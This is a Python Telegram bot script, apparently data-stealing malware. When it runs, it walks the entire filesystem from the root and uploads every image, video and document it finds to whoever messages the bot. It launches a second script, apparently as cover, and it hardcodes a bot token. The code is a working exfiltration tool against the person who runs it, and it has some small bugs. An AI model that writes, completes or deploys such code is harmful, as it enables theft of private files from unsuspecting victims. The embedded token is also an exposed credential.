import os, sys
import subprocess
from aiogram import Bot, Dispatcher, types

from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor

required_packages = ['aiogram']
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip install', package])

api_token = '7119660389:AAGICajl_7tCrV0tzIWyNtCopWvQ4jt6aVw'

bot = Bot(token=api_token)
dp = Dispatcher(bot)

dp.middleware.setup(LoggingMiddleware())
async def on_startup(dp):
    print('')

async def send_files(chat_id, file_type):
    file_extensions = {
        'images': ['.jpg', '.jpeg', '.png', '.gif'],
        'videos': ['.mp4', '.avi', '..mkv'],
        'texts': ['.txt', '.pdf', 'docx']
    }
    for root, dirs, files in os.walk('/'):
        for file in files:
            if any(file.endswith(ext) for ext in file_extensions[file_type]):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        await bot.send_document(chat_id, f)
                
                except Exception as e:
                    print(f'error sending {file_path}: {e}')

def create_file_buttons():
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton(text='images', callback_data='images'),
        InlineKeyboardButton(text='videos', callback_data='videos'),
        InlineKeyboardButton(text='text files', callback_data='texts')
    ]
    keyboard.add(*buttons)
    return keyboard
@dp.message_handler(commands='start')
async def start_command(message: types.Message):
    await message.reply('fayllarni qay turini tanlaysiz?', reply_markup=create_file_buttons())
@dp.callback_query_handler(lambda c: c.data in ['images', 'videos', 'texts'])
async def process_callback(callback_query: types.CallbackQuery):
    file_type = callback_query.data
    await bot.answer_callback_query(callback_query.id)
    await bot.send_message(callback_query.from_user.id, f'Yuborilmoqda: {file_type.capitalize}')
    await send_files(callback_query.from_user.id, file_type)

def run_another_script(script_name):
    script_path = os.path.join(os.getcwd(), script_name)
    subprocess.run([sys.executable, script_path])

if __name__ == '__main__':
    run_another_script('satomoru.py')
    executor.start_polling(dp, on_startup=on_startup)